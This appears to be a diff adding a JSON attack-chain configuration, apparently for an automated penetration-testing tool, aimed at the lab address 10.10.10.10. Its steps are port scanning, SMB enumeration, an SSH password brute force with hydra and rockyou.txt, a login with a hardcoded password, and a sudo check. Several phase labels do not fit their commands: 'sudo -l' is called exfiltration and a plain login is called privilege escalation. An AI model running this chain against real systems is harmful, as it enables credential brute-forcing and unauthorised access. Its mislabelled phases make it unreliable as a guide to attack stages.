@@ -1,0 +1,25 @@
+{
+  "name": "ariaska_gpt_chain",
+  "chain": [
+    {
+      "phase": "recon",
+      "command": "nmap -sC -sV -p- 10.10.10.10"
+    },
+    {
+      "phase": "enumeration",
+      "command": "enum4linux -a 10.10.10.10"
+    },
+    {
+      "phase": "exploit",
+      "command": "hydra -L users.txt -P rockyou.txt ssh://10.10.10.10"
+    },
+    {
+      "phase": "privesc",
+      "command": "sshpass -p 'password123' ssh user@10.10.10.10"
+    },
+    {
+      "phase": "exfiltrate",
+      "command": "sudo -l"
+    }
+  ]
+}
